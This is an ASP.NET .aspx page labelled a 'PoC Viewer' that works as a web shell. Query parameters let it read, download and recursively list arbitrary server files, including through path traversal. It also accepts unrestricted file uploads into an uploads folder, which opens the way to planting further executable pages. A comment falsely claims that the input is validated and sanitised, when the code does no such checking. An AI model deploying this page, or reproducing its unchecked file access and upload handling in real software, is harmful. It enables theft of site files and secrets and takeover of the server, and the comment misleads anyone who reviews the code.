<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html>
<head>
    <title>PoC Viewer with File Upload</title>
</head>
<body>
    <h1>PoC Viewer with File Upload</h1>
    <form id="form1" runat="server">
        <div>
            <h2>File Upload</h2>
            <asp:FileUpload ID="FileUploadControl" runat="server" />
            <asp:Button ID="UploadButton" runat="server" Text="Upload File" OnClick="UploadFile" />
            <br />
            <asp:Label ID="StatusLabel" runat="server" Text=""></asp:Label>
        </div>
    </form>

    <hr />

    <%-- Existing code for PoC Viewer --%>
    <script Language="c#" runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            string param = Request.QueryString["PoC"];
            string downloadParam = Request.QueryString["download"];
            bool recurse = Request.QueryString["recurse"] == "true";

            // Perform proper input validation and sanitize the input
            if (!string.IsNullOrEmpty(param))
            {
                try
                {
                    // Combine the provided path with a base path
                    string basePath = Server.MapPath("~/"); // Use the appropriate base path

                    if (param == ".")
                    {
                        // List files and folders in the base directory
                        ListDirectory(basePath, recurse);
                    }
                    else
                    {
                        // Combine the provided path with the base path
                        string fullPath = Path.Combine(basePath, param);

                        if (File.Exists(fullPath))
                        {
                            // Read and display the content of the file
                            string content = File.ReadAllText(fullPath);

                            if (!string.IsNullOrEmpty(downloadParam) && downloadParam.ToLower() == "true")
                            {
                                // Set the appropriate headers for file download
                                Response.Clear();
                                Response.ContentType = "application/octet-stream";
                                Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(fullPath));
                                Response.Write(content);
                                Response.End();
                            }
                            else
                            {
                                // Display file content
                                Response.Write(Server.HtmlEncode(content));
                            }
                        }
                        else if (Directory.Exists(fullPath))
                        {
                            // List files and folders in the specified directory
                            ListDirectory(fullPath, recurse);
                        }
                        else
                        {
                            Response.Write("File or directory not found at the specified path.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Response.Write("An error occurred: " + ex.Message);
                }
            }
            else
            {
                Response.Write("PoC parameter not provided.");
            }
        }

        private void ListDirectory(string directoryPath, bool recurse)
        {
            string[] items = Directory.GetFileSystemEntries(directoryPath);

            if (items.Length > 0)
            {
                foreach (string item in items)
                {
                    Response.Write(item + "<br/>");

                    if (recurse && Directory.Exists(item))
                    {
                        ListDirectory(item, recurse);
                    }
                }
            }
            else
            {
                Response.Write("No files or folders found in the directory.");
            }
        }

        protected void UploadFile(object sender, EventArgs e)
{
    if (FileUploadControl.PostedFile != null && FileUploadControl.PostedFile.ContentLength > 0)
    {
        try
        {
            // Get the file name and path
            string fileName = Path.GetFileName(FileUploadControl.PostedFile.FileName);
            string filePath = Server.MapPath("~/uploads/") + fileName;

            // Check if the uploads directory exists, create it if not
            string uploadDirectory = Server.MapPath("~/uploads/");
            if (!Directory.Exists(uploadDirectory))
            {
                Directory.CreateDirectory(uploadDirectory);
            }

            // Save the file to the uploads directory
            FileUploadControl.PostedFile.SaveAs(filePath);
            StatusLabel.Text = "File uploaded successfully!";
        }
        catch (Exception ex)
        {
            StatusLabel.Text = "An error occurred while uploading the file: " + ex.Message;
        }
    }
    else
    {
        StatusLabel.Text = "No file selected for upload.";
    }
}

    </script>
</body>
</html>
